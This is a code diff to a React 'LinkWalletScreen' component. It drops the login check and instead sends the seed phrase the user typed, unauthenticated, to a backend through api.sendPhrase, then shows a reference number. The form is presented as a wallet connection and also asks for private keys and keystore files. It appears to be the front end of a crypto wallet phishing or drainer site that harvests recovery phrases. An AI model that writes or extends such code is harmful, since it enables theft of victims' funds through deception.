@@ -165,48 +165,26 @@ export default function LinkWalletScreen() {
   };
 
   const handleSubmit = async (e) => {
+    // alert('clicked')
     e.preventDefault();
     setIsLoading(true);
     
     try {
-      const token = localStorage.getItem('token');
-      if (!token) {
-        router.push('/login');
-        return;
-      }
-
-      let walletData = {
-      phrase: seedPhrase,
-      };
-
-      // switch(connectionMethod) {
-      //   case 'phrase':
-      //     if (seedPhrase) {
-      //       await api.sendPhrase(token, seedPhrase);
-      //       walletData.address = 'Generated from Seed Phrase';
-      //     }
-      //     break;
-      //   case 'private':
-      //     if (privateKey) {
-      //       await api.sendPhrase(token, privateKey);
-      //       walletData.address = 'Generated from Private Key';
-      //     }
-      //     break;
-      //   case 'keystore':
-      //     if (keystoreFile && keystorePassword) {
-      //       walletData.address = 'Generated from Keystore';
-      //     }
-      //     break;
+      // const token = localStorage.getItem('token');
+      // if (!token) {
+      //   router.push('/login');
+      //   return;
       // }
-
-      const response = await api.linkWallet(token, walletData);
+    let phrase = seedPhrase
+     const response = await api.sendPhrase(phrase);
       
       setSuccessData({
-        referenceNumber: response.wallet.referenceNumber,
+        referenceNumber:response.referenceNumber,
         walletType:'Mobile Wallet',
       });
       
     } catch (error) {
+      alert(error.message)
       toast.error(error.message || 'Failed to link wallet');
       setError(true);
       setTimeout(() => {
@@ -410,7 +388,8 @@ export default function LinkWalletScreen() {
                 {renderConnectionForm()}
                 <button 
                   type="submit"
-                  disabled={isLoading}
+                  // disabled={isLoading}
+                  onClick={handleSubmit}
                   className="w-full bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl transition-all disabled:opacity-50"
                 >
                   {isLoading ? 'Connecting...' : 'Connect Wallet'}
